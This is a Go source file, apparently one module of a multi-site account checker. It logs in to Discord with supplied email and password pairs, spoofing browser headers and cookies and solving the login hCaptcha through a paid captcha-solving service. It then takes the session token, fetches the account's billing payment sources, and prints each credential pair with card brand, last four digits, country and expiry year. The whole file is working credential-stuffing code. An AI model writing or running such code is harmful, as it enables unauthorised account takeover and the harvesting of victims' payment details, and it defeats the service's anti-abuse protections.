package modules

import (
	"encoding/json"
	"fmt"
	"strings"

	"github.com/go-resty/resty/v2"
	"github.com/gookit/color"
	"github.com/shelovesmox/minx-aio/captcha"
	"github.com/shelovesmox/minx-aio/utils"
)

func Discord(email string, password string) {

	config, err := utils.ReadConfig("config.yml")
	if err != nil {
		fmt.Println(err)
	}

	client := resty.New()

	resp, err := client.R().
		SetHeader("Host", "discord.com").
		SetHeader("Connection", "keep-alive").
		SetHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36").
		SetHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9").
		SetHeader("Sec-Fetch-Site", "none").
		SetHeader("Sec-Fetch-Mode", "navigate").
		SetHeader("Sec-Fetch-User", "?1").
		SetHeader("Sec-Fetch-Dest", "document").
		SetHeader("sec-ch-ua", "\"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92\"").
		SetHeader("sec-ch-ua-mobile", "?0").
		SetHeader("Upgrade-Insecure-Requests", "1").
		SetHeader("Accept-Encoding", "gzip, deflate, br").
		SetHeader("Accept-Language", "en-us,en;q=0.9").
		Get("https://discord.com")

	if err != nil {
		fmt.Println("Error making request:", err)
		return
	}

	var dcf, sdc, cfr string

	for _, cookie := range resp.Cookies() {
		switch cookie.Name {
		case "__dcfduid":
			dcf = cookie.Name + "=" + cookie.Value
		case "__sdcfduid":
			sdc = cookie.Name + "=" + cookie.Value
		case "__cfruid":
			cfr = cookie.Name + "=" + cookie.Value
		}
	}

	result, err := captcha.SolveCapMonsterHcaptcha(config.CaptchaKey, "https://discord.com/login", "f5561ba9-8f1e-40ca-9b5b-a0b3f719ef34")
	if err != nil {
		fmt.Println("Failed to solve captcha: ", err)
	}

	payload := map[string]interface{}{
		"login":            email,
		"password":         password,
		"undelete":         false,
		"captcha_key":      result.GRecaptchaResponse,
		"login_source":     nil,
		"gift_code_sku_id": nil,
	}

	resp, err = client.R().
		SetHeader("accept", "*/*").
		SetHeader("accept-language", "en-US,en;q=0.9").
		SetHeader("content-length", "137").
		SetHeader("content-type", "application/json").
		SetHeader("cookie", fmt.Sprintf("%s; %s; _gcl_au=1.1.1592145993.1682700152; _ga=GA1.1.1019148912.1682700152; locale=en-US; OptanonConsent=isIABGlobal=false&datestamp=Wed+Jun+14+2023+23%3A19%3A51+GMT-0400+(Eastern+Daylight+Time)&version=6.33.0&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1&AwaitingReconsent=false; _ga_Q149DFWHT7=GS1.1.1686799189.8.0.1686799206.0.0.0; __cf_bm=9UB9_OYF3_9wmU4O.Wj_BZz5aUjyg83Qmy3UnYyscs0-1686799250-0-AXk7LI7LCdHTWYd9BH/A8jfPL6/5/LhhEt3s4qv9IqUL2cvrpHndMmXNllCITUnIzQ==; %s;", dcf, sdc, cfr)).
		SetHeader("origin", "https://discord.com").
		SetHeader("referer", "https://discord.com/login").
		SetHeader("sec-ch-ua", `"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"`).
		SetHeader("sec-ch-ua-mobile", "?0").
		SetHeader("sec-ch-ua-platform", `"macOS"`).
		SetHeader("sec-fetch-dest", "empty").
		SetHeader("sec-fetch-mode", "cors").
		SetHeader("sec-fetch-site", "same-origin").
		SetHeader("user-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36").
		SetHeader("x-debug-options", "bugReporterEnabled").
		SetHeader("x-discord-locale", "en-US").
		SetHeader("x-discord-timezone", "America/New_York").
		SetHeader("x-super-properties", "eyJvcyI6Ik1hYyBPUyBYIiwiYnJvd3NlciI6IkNocm9tZSIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTIuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjExMi4wLjAuMCIsIm9zX3ZlcnNpb24iOiIxMC4xNS43IiwicmVmZXJyZXIiOiJodHRwczovL3d3dy5nb29nbGUuY29tLyIsInJlZmVycmluZ19kb21haW4iOiJ3d3cuZ29vZ2xlLmNvbSIsInNlYXJjaF9lbmdpbmUiOiJnb29nbGUiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjA1NjU5LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==").
		SetBody(payload).
		Post("https://discord.com/api/v9/auth/login")

	if err != nil {
		fmt.Println("Error: ", err)
	}
	var token string
	responseBody := resp.String()

	if strings.Contains(responseBody, "Invalid Form Body") {
		fmt.Println("Invalid Account: Invalid Form Body")
	} else if strings.Contains(responseBody, "token") {
		var responseMap map[string]interface{}
		err := json.Unmarshal([]byte(responseBody), &responseMap)
		if err != nil {
			fmt.Println("Error unmarshaling JSON:", err)
			return
		}

		token = responseMap["token"].(string)
		fmt.Println("Token:", token)
	}

	fmt.Println(token)

	resp, err = client.R().
		SetHeader("accept", "*/*").
		SetHeader("accept-language", "en-US,en;q=0.9").
		SetHeader("authorization", token).
		SetHeader("content-length", "137").
		SetHeader("content-type", "application/json").
		SetHeader("cookie", fmt.Sprintf("%s; %s; _gcl_au=1.1.1592145993.1682700152; _ga=GA1.1.1019148912.1682700152; locale=en-US; OptanonConsent=isIABGlobal=false&datestamp=Wed+Jun+14+2023+23%3A19%3A51+GMT-0400+(Eastern+Daylight+Time)&version=6.33.0&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1&AwaitingReconsent=false; _ga_Q149DFWHT7=GS1.1.1686799189.8.0.1686799206.0.0.0; __cf_bm=9UB9_OYF3_9wmU4O.Wj_BZz5aUjyg83Qmy3UnYyscs0-1686799250-0-AXk7LI7LCdHTWYd9BH/A8jfPL6/5/LhhEt3s4qv9IqUL2cvrpHndMmXNllCITUnIzQ==; %s;", dcf, sdc, cfr)).
		SetHeader("origin", "https://discord.com").
		SetHeader("referer", "https://discord.com/login").
		SetHeader("sec-ch-ua", `"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"`).
		SetHeader("sec-ch-ua-mobile", "?0").
		SetHeader("sec-ch-ua-platform", `"macOS"`).
		SetHeader("sec-fetch-dest", "empty").
		SetHeader("sec-fetch-mode", "cors").
		SetHeader("sec-fetch-site", "same-origin").
		SetHeader("user-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36").
		SetHeader("x-debug-options", "bugReporterEnabled").
		SetHeader("x-discord-locale", "en-US").
		SetHeader("x-discord-timezone", "America/New_York").
		SetHeader("x-super-properties", "eyJvcyI6Ik1hYyBPUyBYIiwiYnJvd3NlciI6IkNocm9tZSIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTIuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjExMi4wLjAuMCIsIm9zX3ZlcnNpb24iOiIxMC4xNS43IiwicmVmZXJyZXIiOiJodHRwczovL3d3dy5nb29nbGUuY29tLyIsInJlZmVycmluZ19kb21haW4iOiJ3d3cuZ29vZ2xlLmNvbSIsInNlYXJjaF9lbmdpbmUiOiJnb29nbGUiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjA1NjU5LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==").
		Get("https://discord.com/api/v9/users/@me/billing/payment-sources")

	responseBody = resp.String()

	type PaymentCapture struct {
		ID          string `json:"id"`
		Brand       string `json:"brand"`
		Last4       string `json:"last_4"`
		Country     string `json:"country"`
		ExpiresYear int    `json:"expires_year"`
	}

	type NitroCheck struct {
		Status bool `json:"status"`
	}

	// Parse payment response
	// Parse payment response
	var paymentResponse []PaymentCapture
	err = json.Unmarshal([]byte(responseBody), &paymentResponse)
	if err != nil {
		fmt.Println("Error unmarshaling payment JSON:", err)
		return
	}

	// Check if payment response is empty
	if len(paymentResponse) > 0 {
		payment := paymentResponse[0]
		captureString := fmt.Sprintf("%s:%s - Payment Details: Brand: %s - Last 4 Digits: %s - Country: %s - Expires Year: %d", email, password, payment.Brand, payment.Last4, payment.Country, payment.ExpiresYear)
		color.Green.Println(captureString)
	} else {
		color.Green.Println(email + ":" + password + " Payment Details: Empty")
	}

}
